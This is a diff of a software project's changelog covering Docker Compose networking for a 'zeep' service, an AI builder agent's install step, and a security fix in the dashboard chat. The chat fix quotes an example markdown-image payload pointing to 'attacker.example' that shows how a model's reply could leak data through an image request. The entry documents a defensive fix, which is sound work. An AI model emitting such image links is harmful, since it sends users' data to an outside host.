@@ -28,6 +28,7 @@ Versioning follows [Semantic Versioning](https://semver.org/).
 
 - **Docker Compose: the `zeep` service now joins two networks.** It is attached to `default` and `builder_internal` so it can reach the builder when the `builder` profile is on, and passes `BUILDER_URL` and `BUILDER_SHARED_SECRET` through from `.env` (both empty by default, which keeps the builder off). Without the profile nothing else runs and behavior is unchanged.
 - **Dashboard: the chat bubbles of "Build with AI" and "Edit with AI" no longer render remote images.** `ChatMarkdown`, shared with the new builder chat, now renders a markdown image as its alt text instead of an `<img>`. Before, a model answer containing `![x](https://attacker.example/?d=...)` made the browser request that URL. Replies that contained images now show the alt text.
+- **AI Builder: the agent now runs `install` before its first `typecheck`, `lint` or `build` in a session.** The previous rule only asked for `install` when the agent knew dependencies had changed, but it cannot tell whether `node_modules` exists, so a fresh project could fail every build step and end on `limit_reached`.
 
 ### Security
 
